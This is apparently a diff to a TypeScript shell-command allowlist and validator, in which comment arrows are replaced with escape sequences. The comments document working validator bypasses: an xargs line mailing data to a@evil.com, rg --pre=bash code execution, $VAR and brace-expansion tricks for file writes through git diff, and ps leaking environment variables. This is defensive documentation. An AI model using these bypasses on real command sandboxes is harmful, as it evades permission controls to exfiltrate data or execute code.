@@ -137,14 +137,14 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       //
       // `-i` (`i::` — optional replace-str):
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET \u2192 break
+      //   GNU: -i replace-str=t, tail \u2192 /usr/sbin/sendmail \u2192 NETWORK EXFIL
       //
       // `-e` (`e::` — optional eof-str):
       //   cat data | xargs -e EOF echo foo
       //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      //   GNU: -e no attached arg \u2192 no eof-str, 'EOF' is the TARGET COMMAND
+      //   \u2192 executes binary named EOF from PATH \u2192 CODE EXEC (malicious repo)
       //
       // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
       // arg) instead — both validator and xargs agree on argument consumption.
@@ -660,7 +660,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       // From man tree (< 2.1.0): "-R — at each of them execute tree again
       // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
       // depth" was misleading — the "rerun" includes a hardcoded -o file write.
-      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
+      // `tree -R -H . -L 2 /path` \u2192 writes /path/<subdir>/00Tree.html for each
       // subdir at depth 2. FILE WRITE, zero permissions.
       '-P': 'string', // Include pattern
       '-I': 'string', // Exclude pattern
@@ -971,7 +971,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-x': 'none',
       // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
       // It must NOT be in safeFlags because validateFlags unbundles combined
-      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
+      // short flags (e.g., -xS \u2192 -x + -S), but the callback receives the raw
       // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
       // from safeFlags ensures validateFlags rejects it (bundled or not) before
       // the callback runs. The callback's -S check is defense-in-depth.
@@ -1328,22 +1328,22 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
 
   // SECURITY: Reject ANY token containing `$` (variable expansion). The
   // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
-  // in tokens, but bash expands it at runtime (unset vars → empty string).
+  // in tokens, but bash expands it at runtime (unset vars \u2192 empty string).
   // This parser differential defeats BOTH validateFlags and callbacks:
   //
   //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
-  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
+  //       `git diff "$Z--output=/tmp/pwned"` \u2192 token `$Z--output=/tmp/pwned`
   //       (starts with `$`) falls through as positional at ~:1730. Bash runs
   //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
   //
-  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
-  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
+  //   (2) `$VAR`-prefix \u2192 RCE via `rg --pre`:
+  //       `rg . "$Z--pre=bash" FILE` \u2192 executes `bash FILE`. rg's config has
   //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
   //
   //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
-  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
-  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
-  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
+  //       `ps ax"$Z"e` \u2192 token `ax$Ze`. The ps callback regex
+  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` \u2192 "not dangerous". Bash runs
+  //       `ps axe` \u2192 env vars for all processes. A fix limited to `$`-PREFIXED
   //       tokens would NOT close this.
   //
   // We check ALL tokens after the command prefix. Any `$` means we cannot
@@ -1357,8 +1357,8 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
       return false
     }
     // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
-    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
-    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
+    // `git diff {@'{'0},--output=/tmp/pwned}` \u2192 shell-quote strips quotes
+    // \u2192 token `{@{0},--output=/tmp/pwned}` has `{` + `,` \u2192 brace expansion.
     // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
     // We require BOTH `{` and `,` to avoid false positives on legitimate
     // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
@@ -1581,10 +1581,10 @@ const READONLY_COMMAND_REGEXES = new Set([
  * Globs are literal inside BOTH single and double quotes.
  *
  * Variable expansion examples:
- * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
+ * - `uniq --skip-chars=0$_` \u2192 `$_` expands to last arg of previous command;
  *   with IFS word splitting, this smuggles positional args past "flags-only"
- *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
- * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
+ *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` \u2192 FILE WRITE.
+ * - `cd "$HOME"` \u2192 double-quoted `$HOME` expands at runtime.
  * Variables are literal ONLY inside single quotes; they expand inside double
  * quotes and unquoted.
  *
@@ -1620,7 +1620,7 @@ function containsUnquotedExpansion(command: string): boolean {
     // instead of toggling inSingleQuote. Parser stays in single-quote
     // mode for the rest of the command, missing ALL subsequent expansions.
     // Example: `ls '\' *` — bash sees glob `*`, but desynced parser thinks
-    // `*` is inside quotes → returns false (glob NOT detected).
+    // `*` is inside quotes \u2192 returns false (glob NOT detected).
     // Defense-in-depth: hasShellQuoteSingleQuoteBug catches `'\'` patterns
     // before this function is reached, but we fix the tracker anyway for
     // consistency with the correct implementations in bashSecurity.ts.
